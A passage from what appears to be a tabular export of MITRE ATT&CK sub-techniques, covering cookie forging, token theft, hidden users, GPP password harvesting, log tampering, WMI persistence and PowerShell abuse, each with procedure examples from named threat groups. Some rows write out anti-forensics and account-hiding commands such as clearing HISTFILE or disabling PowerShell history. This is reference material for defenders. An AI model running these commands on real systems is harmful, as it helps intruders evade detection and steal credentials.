(IPFS) to host link targets that are difficult to remove.","['[LuminousMoth] has created a link to a Dropbox file that has been used in their spear-phishing operations.', '[Silent Librarian] has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. [Silent Librarian] has also made use of a variety of URL shorteners for these staged websites.']",False
T1606.001,Web Cookies,"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.  Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie] and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, [Private Keys] or other cryptographic seed values.  Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie] which may bypass multi-factor and other authentication protection mechanisms.","['During the [SolarWinds Compromise] [APT29] bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.', '[APT29] has bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.', '[UNC2452] bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.']",False
T1134.001,Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.  An adversary may perform [Token Impersonation/Theft] when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.  When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token] using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft] is also distinct from [Make and Impersonate Token] in that it refers to duplicating an existing token, rather than creating a new one.","['[FinFisher] uses token manipulation with NtFilterToken as part of UAC bypass.', '[Emotet] has the ability to duplicate the user’s token.', '[Stuxnet] attempts to impersonate an anonymous token to enumerate bindings in the service control manager.', '[Cobalt Strike] can steal access tokens from exiting processes.', '[Tarrask] leverages token theft to obtain `lsass.exe` security permissions. ', '[SILENTTRINITY] can find a process owned by a specific user and impersonate the associated token.', '[BitPaymer] can use the tokens of users to create processes on infected systems.', '[Shamoon] can impersonate tokens using <code>LogonUser</code>, <code>ImpersonateLoggedOnUser</code>, and <code>ImpersonateNamedPipeClient</code>.', ""[Okrum] can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API."", '[Aria-body] has the ability to duplicate a token from ntprint.exe.', '[APT28] has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.', '[REvil] can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.', '[Pupy] can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.', '[BADHATCH] can impersonate a `lsass.exe` or `vmtoolsd.exe` token. ', '[Siloscape] impersonates the main thread of <code>CExecSvc.exe</code> by calling <code>NtImpersonateThread</code>.', '[FIN8] has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.', '[Cobalt Strike] can steal access tokens from exiting processes.']",False
T1567.001,Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.  Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ",['[Empire] can use GitHub for data exfiltration.'],False
T1021.007,Cloud Services,"Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts] that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user.   Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API] using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.  In some cases, adversaries may be able to authenticate to these services via [Application Access Token] instead of a username and password. ","['During [C0027] [Scattered Spider] used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.', '[APT29] has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell.', 'During [C0027] [Scattered Spider] used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.  Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes.']",False
T1205.001,Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.  This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.  The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","['[Mafalda] can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server.', '[PROMETHIUM] has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.', '[metaMain] has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure.']",
T1027.012,LNK Icon Smuggling,"Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory.   Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File] payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter] Binary Proxy Execution] arguments within the target path field of the LNK.  LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.  ",[],False
T1583.006,Web Services,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service] [Exfiltration Over Web Service] or [Phishing] Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.","['[Earth Lusca] has established GitHub accounts to host their malware.', '[HAFNIUM] has acquired web services for use in C2 and exfiltration.', '[Turla] has created web accounts including Dropbox and GitHub for C2 and document exfiltration.', '[ZIRCONIUM] has used GitHub to host malware linked in spearphishing e-mails.', '[APT17] has created profile pages in Microsoft TechNet that were used as C2 infrastructure.', '[MuddyWater] has used file sharing services including OneHub, Sync, and TeraBox to distribute tools.', '[APT28] has used newly-created Blogspot pages for credential harvesting operations.', '[APT29] has registered algorithmically generated Twitter handles that are used for C2 by malware, such as [HAMMERTOSS] [APT29] has also used legitimate web services such as Dropbox and Constant Contact in their operations.', '[FIN7] has set up Amazon S3 buckets to host trojanized digital products.', 'For [Operation Sharpshooter] the threat actors used Dropbox to host lure documents and their first-stage downloader.', 'During [Operation Dream Job] [Lazarus Group] used file hosting services like DropBox and OneDrive.', '[Lazarus Group] has hosted malicious downloads on Github.', '[Confucius] has obtained cloud storage service accounts to host stolen data.', '[IndigoZebra] created Dropbox accounts for their operations.', '[POLONIUM] has created and used legitimate Microsoft OneDrive accounts for their operations.', '[APT32] has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads.', '[Kimsuky] has hosted content used for targeting efforts via web services such as Blogspot.', '[TA2541] has hosted malicious files on various platforms including Google Drive, OneDrive, Discord, PasteText, ShareText, and GitHub.', '[Magic Hound] has acquired Amazon S3 buckets to use in C2.', '[LazyScripter] has established GitHub accounts to host its toolsets.']",False
T1598.002,Spearphishing Attachment,"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts] or [Compromise Accounts] and/or sending multiple, seemingly urgent messages.  All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains] or [Search Victim-Owned Websites] to craft persuasive and believable lures.","['[Dragonfly] has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials.', '[Sidewinder] has sent e-mails with malicious attachments that lead victims to credential harvesting websites.', '[SideCopy] has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts.']",
T1098.001,Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.  For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.  In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts] adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.  Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts] For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.   In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials] tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated. ","['[Pacu] can generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users.', 'During [C0027] [Scattered Spider] used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.', 'During the [SolarWinds Compromise] [APT29] added credentials to OAuth Applications and Service Principals.', '[APT29] has added credentials to OAuth Applications and Service Principals.', '[UNC2452] added credentials to OAuth Applications and Service Principals. ']",False
T1491.001,Internal Defacement,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of [Internal Defacement] in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.","[""[Gamaredon Group] has left taunting images and messages on the victims' desktops as proof of system access."", ""[Black Basta] has set the desktop wallpaper on victims' machines to display a ransom note."", ' After encryption, [Diavol] will capture the desktop background window, set the background color to black, and change the desktop wallpaper to a newly created bitmap image with the text “All your files are encrypted! For more information see “README-FOR-DECRYPT.txt"".', '[Meteor] can change both the desktop wallpaper and the lock screen image to a custom image.', '[Lazarus Group] replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a [Disk Structure Wipe]', '[BlackCat] can change the desktop wallpaper on compromised hosts.']",False
T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.   In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.   Adversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.  On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.","['[Dragonfly] has modified the Registry to hide created user accounts.', '[SMOKEDHAM] has modified the Registry to hide created user accounts from the Windows logon screen. ', '[Kimsuky] has run <code>reg add ‘HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList’ /v</code> to hide a newly created user.', '[Dragonfly 2.0] modified the Registry to hide create user accounts. ']",False
T1134.003,Make and Impersonate Token,"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.  This behavior is distinct from [Token Impersonation/Theft] in that this refers to creating a new user token instead of stealing or duplicating an existing one.","['[Mafalda] can create a token for a different user.', '[FIN13] has utilized tools such as Incognito V2 for token manipulation and impersonation.', '[Cobalt Strike] can make tokens from known credentials.', '[Cobalt Strike] can make tokens from known credentials.']",False
T1552.006,Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.  These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).  The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:  * Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code> * Get-GPPPassword * gpprefdecrypt.py  On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code> ","['[SILENTTRINITY] has a module that can extract cached GPP passwords. ', '[PowerSploit] contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences.', '[APT33] has used a variety of publicly available tools like Gpppassword to gather credentials.', '[Wizard Spider] has used PowerShell cmdlets `Get-GPPPassword` and `Find-GPOPassword` to find unsecured credentials in a compromised network group policy.']",
T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.   Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin.   Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ","[""[APT28] has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS."", '[Rclone] can exfiltrate data over SFTP or HTTPS via WebDAV.', ""During the [SolarWinds Compromise] [APT29] exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers."", ""[APT29] has exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers."", ""[UNC2452] exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.""]",
T1087.004,Cloud Account,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.  With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.   The AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix. In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.","['During [C0027] [Scattered Spider] accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes.', '[ROADTools] can enumerate Azure AD users.', '[AADInternals] can enumerate Azure AD users.', '[APT29] has conducted enumeration of Azure AD accounts.', '[Pacu] can enumerate IAM users, roles, and groups. ']",
T1562.003,Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.   On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.  Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.   On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.  Adversaries may also leverage a [Network Device CLI] on network devices to disable historical command logging (e.g. <code>no logging</code>).","['[APT38] has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.', '[SILENTTRINITY] can bypass ScriptBlock logging to execute unmanaged PowerShell code from memory.']",False
T1053.004,Launchd,"This technique is deprecated due to the inaccurate usage. The report cited did not provide technical detail as to how the malware interacted directly with launchd rather than going through known services. Other system services are used to interact with launchd rather than launchd being used by itself.   Adversaries may abuse the <code>Launchd</code> daemon to perform task scheduling for initial or recurring execution of malicious code. The <code>launchd</code> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> . These LaunchDaemons have property list files which point to the executables that will be launched .  An adversary may use the <code>launchd</code> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <code>launchd</code> can also be abused to run a process under the context of a specified account. Daemons, such as <code>launchd</code>, run with the permissions of the root user account, and will operate regardless of which user account is logged in.",[],
T1556.008,Network Provider DLL,"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.   Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`. Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.  Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.",[],False
T1546.003,Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.  Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.  WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.","['[Blue Mockingbird] has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.', '[Sardonic] can use a WMI event filter to invoke a command-line event consumer to gain persistence.', '[APT29] has used WMI event subscriptions for persistence.', '[metaMain] registered a WMI event subscription consumer called ""hard_disk_stat"" to establish persistence.', '[HEXANE] has used WMI event subscriptions for persistence.', '[FIN8] has used WMI event subscriptions for persistence.', '[RegDuke] can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started.', '[SILENTTRINITY] can create a WMI Event to execute a payload for persistence.', '[Leviathan] has used WMI for persistence.', '[HOPLIGHT] can use WMI event subscriptions to create persistence.', 'During the [SolarWinds Compromise] [APT29] used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with `rundll32.exe`.', '[Turla] has used WMI event filters and consumers to establish persistence.', '[Metador] has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as `cdb.exe`.', '[APT33] has attempted to use WMI event subscriptions to establish persistence on compromised hosts.', '[BADHATCH] can use WMI event subscriptions for persistence.', '[Kevin] can compile randomly-generated MOF files into the WMI repository to persistently run malware.', 'During [Operation Ghost] [APT29] used WMI event subscriptions to establish persistence for malware.', '[Mustang Panda] custom ORat tool uses a WMI event consumer to maintain persistence.', '[adbupd] can use a WMI script to achieve persistence.', '[Rancor] has complied VBScript-generated MOF files into WMI event subscriptions for persistence.', '[SeaDuke] uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.', '[POSHSPY] uses a WMI event subscription to establish persistence.', '[PoshC2] has the ability to persist on a system using WMI events.', '[TrailBlazer] has the ability to use WMI for persistence.', '[POWERTON] can use WMI for persistence.', '[UNC2452] used WMI event subscriptions for persistence.']",False
T1596.004,CDNs,"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.  Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning] or [Search Open Websites/Domains] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [Drive-by Compromise]",[],
T1497.002,User Activity Based Checks,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion] during automated discovery to shape follow-on behaviors.  Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate. ","['[Darkhotel] has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.', '[Okrum] loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments. ', '[FIN7] used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.', '[Spark] has used a splash screen to check whether an user actively clicks on the screen before running malicious code. ']",
T1585.003,Cloud Accounts,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage] or to [Upload Tool] Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server] or [Serverless] infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.  Creating [Cloud Accounts] may also require adversaries to establish [Email Accounts] to register with the cloud provider. ",[],False
T1134.004,Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.  Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell] to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment] This spoofing could be executed via [Visual Basic] within a malicious Office document or any code that can perform [Native API]  Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.","['[KONNI] has used parent PID spoofing to spawn a new `cmd` process using `CreateProcessW` and a handle to `Taskmgr.exe`. ', '[Cobalt Strike] can spawn processes with alternate PPIDs.', '[PipeMon] can use parent PID spoofing to elevate privileges.', '[DarkGate] relies on parent PID spoofing as part of its ""rootkit-like"" functionality to evade detection via Task Manager or Process Explorer.', '[Cobalt Strike] can spawn processes with alternate PPIDs.']",False
T1552.008,Chat Messages,"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.  Rather than accessing the stored chat logs (i.e., [Credentials In Files] adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation .","['[LAPSUS$] has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement.']",False
T1059.001,PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire]  [PowerSploit] [PoshC2] and PSAttack.  PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).","['[WIRTE] has used PowerShell for script execution.', '[APT5] has used PowerShell to accomplish tasks within targeted environments.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.', '[Blue Mockingbird] has used PowerShell reverse TCP shells to issue interactive commands over a network connection.', '[BADHATCH] can utilize `powershell.exe` to execute commands on a compromised host.', '[Empire] leverages PowerShell for the majority of its client-side agent tasks. [Empire] also contains the ability to conduct PowerShell remoting with the <code>Invoke-PSRemoting</code> module.', '[Zeus Panda] uses PowerShell to download and execute the payload.', '[APT39] has used PowerShell to execute malicious code.', '[Magic Hound] has used PowerShell for execution and privilege escalation.', '[QakBot] can use PowerShell to download and execute payloads.', '[APT19] used PowerShell commands to execute payloads.', '[AppleSeed] has the ability to execute its payload via PowerShell.', '[APT28] downloads and executes PowerShell scripts and performs PowerShell commands.', '[APT41] leveraged PowerShell to deploy malware families in victims’ environments.', '[Sandworm Team] has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses. ', '[REvil] has used PowerShell to delete volume shadow copies and download files.', '[MoustachedBouncer] has used plugins to execute PowerShell scripts.', '[Bazar] can execute a PowerShell script received from C2.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.', '[CopyKittens] has used PowerShell Empire.', '[Woody RAT] can execute PowerShell commands and scripts with the use of .NET DLL, `WoodyPowerSession`. ', '[Pupy] has a module for loading and executing PowerShell scripts.', '[WellMess] can execute PowerShell scripts received from C2.', '[Thrip] leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.', '[WhisperGate] can use PowerShell to support multiple actions including execution and defense evasion.', '[PowerStallion] uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.', '[JCry] has used PowerShell to execute payloads.', '[TrickBot] has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers.   ', '[FIN13] has used PowerShell commands to obtain DNS data from a compromised network.', '[Gorgon Group] malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.', '[MoleNet] can use 